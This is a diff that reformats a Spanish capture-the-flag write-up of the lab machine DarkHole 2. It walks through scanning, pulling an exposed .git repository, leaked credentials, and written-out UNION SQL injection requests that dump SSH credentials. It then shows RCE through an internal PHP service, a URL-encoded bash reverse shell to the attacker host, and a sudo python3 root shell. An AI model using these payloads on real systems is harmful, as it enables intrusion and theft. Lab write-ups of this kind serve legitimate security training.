@@ -72,11 +72,11 @@ Parámetros:
 - `--localnet`: Indica escaneo de toda la red local
 
 ![[darkhole_2-02.webp]]
-	El escaneo identifica la máquina objetivo en "`172.16.23.128`" dentro de la red `vmnet1`.
+El escaneo identifica la máquina objetivo en "`172.16.23.128`" dentro de la red `vmnet1`.
 
 ### Escaneo de Puertos
 
-Una vez sabiendo la IP de la maquina, es bueno proceder a un escaneo exhaustivo para identificar los servicios en ejecución y obtener información de versiones. 
+Una vez sabiendo la IP de la maquina, es bueno proceder a un escaneo exhaustivo para identificar los servicios en ejecución y obtener información de versiones.
 
 Comando utilizado:
 ```
@@ -110,7 +110,7 @@ Confirmación de Puerto 80 abierto en reporte de nmap:
 80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
 ```
 ![[darkhole_2-04.webp]]
-	Se identifica una aplicación web activa con TTL de 64 (indicador de sistema Linux) y servidor Apache httpd 2.4.41 corriendo sobre Sistema Ubuntu.
+Se identifica una aplicación web activa con TTL de 64 (indicador de sistema Linux) y servidor Apache httpd 2.4.41 corriendo sobre Sistema Ubuntu.
 
 ### Puerto 22 - SSH
 
@@ -145,7 +145,7 @@ Comando para descargar repositorio:
 wget -r http://172.16.23.128/.git/
 ```
 ![[darkhole_2-06.webp]]
-	Descargamos con éxito el proyecto y podemos ver su contenido.
+Descargamos con éxito el proyecto y podemos ver su contenido.
 ### Análisis de Commits Git
 
 Como queremos ver si hay información sensible dentro del proyecto solo debemos ver los logs del mismo, cosa que se puede hacer de forma muy sencilla.
@@ -171,8 +171,7 @@ Comando:
 nmap --script http-enum 172.16.23.128
 ```
 ![[darkhole_2-08.webp]]
-	`--script`: Me permite indicarle a nmap un script a ejecutar.
-	`http-enum`: Script de enumeración de subdominios básicos.
+`--script`: Me permite indicarle a nmap un script a ejecutar. `http-enum`: Script de enumeración de subdominios básicos.
 
 Resultados:
 ```
@@ -187,7 +186,7 @@ Resultados:
 
 Se confirma el subdominio "/login.php" mencionado en el commit.
 ![[darkhole_2-09.webp]]
-	Tenemos una Login page, la cual seguramente tiene que ver con las credenciales anteriormente mencionadas. 
+Tenemos una Login page, la cual seguramente tiene que ver con las credenciales anteriormente mencionadas.
 ### Leak de Credenciales en Git
 
 Ya con toda esta información está más que claro que necesitamos las credenciales para iniciar sesión en la página web, para esto verifiquemos el contenido del commit anterior:
@@ -232,7 +231,7 @@ El dashboard presenta un parámetro id en la URL susceptible a inyección SQL.
 ### Explotación con Burp Suite
 
 ![[darkhole_2-12.webp]]
-	Se interceptó la petición GET con Burp Suite y se activó el modo Repeater para pruebas de SQLi manual.
+Se interceptó la petición GET con Burp Suite y se activó el modo Repeater para pruebas de SQLi manual.
 
 #### Proceso de Inyección SQL
 
@@ -243,7 +242,7 @@ Solicitud modificada:
 GET /dashboard.php?id=2 HTTP/1.1
 ```
 ![[darkhole_2-13.webp]]
-	Respuesta: 200 OK. Se accedió al perfil de otro usuario con campos vacíos.
+Respuesta: 200 OK. Se accedió al perfil de otro usuario con campos vacíos.
 
 **Paso 2 - Conteo de columnas:**
 
@@ -261,7 +260,7 @@ Solicitud modificada:
 GET /dashboard.php?id=2'+union+select+1,2,3,4,5,6--+- HTTP/1.1
 ```
 ![[darkhole_2-14.webp]]
-	Los campos 2, 3, 5 y 6 son inyectables y se muestran en la respuesta.
+Los campos 2, 3, 5 y 6 son inyectables y se muestran en la respuesta.
 
 **Paso 4 - Enumeración de bases de datos:**
 
@@ -270,7 +269,7 @@ Solicitud modificada:
 GET /dashboard.php?id=2'+union+select+1,2,group_concat(schema_name),4,5,6+from+information_schema.schemata--+- HTTP/1.1
 ```
 ![[darkhole_2-15.webp]]
-	Bases de datos identificadas: mysql, information_schema, performance_schema, sys, darkhole_2.
+Bases de datos identificadas: mysql, information_schema, performance_schema, sys, darkhole_2.
 
 **Paso 5 - Enumeración de tablas en darkhole_2:**
 
@@ -279,7 +278,7 @@ Solicitud modificada:
 GET /dashboard.php?id=2'+union+select+1,2,group_concat(table_name),4,5,6+from+information_schema.tables+where+table_schema%3d'darkhole_2'--+- HTTP/1.1
 ```
 ![[darkhole_2-16.webp]]
-	Tablas identificadas: ssh, users.
+Tablas identificadas: ssh, users.
 
 **Paso 6 - Enumeración de columnas en tabla ssh:**
 
@@ -288,7 +287,7 @@ Solicitud modificada:
 GET /dashboard.php?id=2'+union+select+1,2,group_concat(column_name),4,5,6+from+information_schema.columns+where+table_schema%3d'darkhole_2'+and+table_name%3d'ssh'--+- HTTP/1.1
 ```
 ![[darkhole_2-17.webp]]
-	Columnas en tabla ssh: id, user, pass.
+Columnas en tabla ssh: id, user, pass.
 
 **Paso 7 - Extracción de credenciales SSH:**
 
@@ -309,7 +308,7 @@ Comando:
 ssh jehad@172.16.23.128
 ```
 ![[darkhole_2.1darkhole_2-09.webp]]
-	Acceso exitoso a la máquina como usuario jehad.
+Acceso exitoso a la máquina como usuario jehad.
 
 ---
 ## III. Post-Explotación y Privesc
@@ -323,46 +322,46 @@ Comando para ver kernel:
 uname -a
 ```
 ![[darkhole_2-19.webp]]
-	Resultado: Linux darkhole 5.4.0-81-generic 91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
+Resultado: Linux darkhole 5.4.0-81-generic 91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
 
 Comando para ver versión del SO:
 ```
 cat /etc/os-release
 ```
 ![[darkhole_2-20.webp]]
-	Resultado: Ubuntu 20.04.3 LTS (Focal Fossa)
+Resultado: Ubuntu 20.04.3 LTS (Focal Fossa)
 
 Comando para verificar privilegios sudo:
 ```
 sudo -l
 ```
 ![[darkhole_2-21.webp]]
-	Resultado: El usuario jehad no tiene permisos sudo.
+Resultado: El usuario jehad no tiene permisos sudo.
 
 Comando para ver grupos:
 ```
 id
 ```
 ![[darkhole_2-22.webp]]
-	Resultado: jehad no pertenece a grupos privilegiados.
+Resultado: jehad no pertenece a grupos privilegiados.
 
 Comando para listar usuarios:
 ```
 cat /etc/passwd
 ```
 ![[darkhole_2-23.webp]]
-	Usuarios con bash: root (UID 0), lama (UID 1000), jehad (UID 1001), losy (UID 1002).
+Usuarios con bash: root (UID 0), lama (UID 1000), jehad (UID 1001), losy (UID 1002).
 
 Comando para ver historial:
 ```
 history
 ```
 ![[darkhole_2-24.webp]]
-	Comandos críticos del historial:
-	1. cd /home/losy
-	2. cd /opt/web
-	3. curl "http://localhost:9999/?cmd=id"
-	4. ssh -L 127.0.0.1:90:192.168.135.129:9999 jehad@192.168.135.129
+Comandos críticos del historial:
+1. cd /home/losy
+2. cd /opt/web
+3. curl "http://localhost:9999/?cmd=id"
+4. ssh -L 127.0.0.1:90:192.168.135.129:9999 jehad@192.168.135.129
 
 > [!tip] ¡Servicio Interno Detectado!
 > Gracias a los comandos ejecutados por el usuarios podemos entender que existe un servicio web interno en puerto 9999 con capacidad de ejecución remota de comandos.
@@ -372,14 +371,14 @@ Comando para listar puertos en escucha:
 netstat -tulpn
 ```
 ![[darkhole_2-25.webp]]
-	Confirmación: servicio en **LISTEN** bajo puerto 9999.
+Confirmación: servicio en **LISTEN** bajo puerto 9999.
 
 Comando para ver procesos:
 ```
 htop
 ```
 ![[darkhole_2-26.webp]]
-	El servicio corre como usuario losy, servidor PHP ubicado en /opt/web.
+El servicio corre como usuario losy, servidor PHP ubicado en /opt/web.
 
 Comandos para revisar el script PHP:
 ```
@@ -387,13 +386,13 @@ cd /opt/web
 cat index.php
 ```
 ![[darkhole_2-27.webp]]
-	Script PHP simple para ejecución remota de comandos vía parámetro cmd.
+Script PHP simple para ejecución remota de comandos vía parámetro cmd.
 
 ### Vector de Escalada
 
 Exploración del directorio home:
 ![[darkhole_2-28.webp]]
-	Se encontró la flag user.txt en /home/.
+Se encontró la flag user.txt en /home/.
 
 #### Explotación del Servicio Interno
 
@@ -402,7 +401,7 @@ Prueba de concepto con curl:
 curl "http://localhost:9999/?cmd=id"
 ```
 ![[darkhole_2-29.webp]]
-	El comando se ejecuta como usuario losy, confirmando RCE.
+El comando se ejecuta como usuario losy, confirmando RCE.
 
 #### Reverse Shell como losy
 
@@ -411,7 +410,7 @@ Listener en máquina atacante:
 nc -lvnp 443
 ```
 ![[darkhole_2-30.webp]]
-	Nos podemos en escucha para recibir la señal que vamos a enviar desde el servicio PHP.
+Nos podemos en escucha para recibir la señal que vamos a enviar desde el servicio PHP.
 
 Para mandar el payload lo debemos hacer en formato "URL Encode". Les dejo un ejemplo de como se vería el comando de forma "normal" y "URL Encoded".
 
@@ -425,7 +424,7 @@ URL Encoded:
 curl "http://localhost:9999/?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/172.16.23.1/443%200%3E%261'"
 ```
 ![[darkhole_2-31.webp]]
-	Shell inversa obtenida como losy.
+Shell inversa obtenida como losy.
 
 > [!WARNING] Advertencia  
 > Una vez establecida la conexión remota mediante netcat, la terminal puede no estar completamente operativa para la interacción directa. Por ello, es recomendable ejecutar un proceso de estabilización antes de continuar con la auditoría, asegurando así un entorno de trabajo más estable y funcional.
@@ -465,7 +464,7 @@ Comando para obtener shell root:
 sudo python3 -c 'import os; os.system("/bin/sh")'
 ```
 ![[darkhole_2-33.webp]]
-	Shell de root obtenida. Flag root.txt capturada en directorio /root.
+Shell de root obtenida. Flag root.txt capturada en directorio /root.
 
 ---
 ## Evidencias
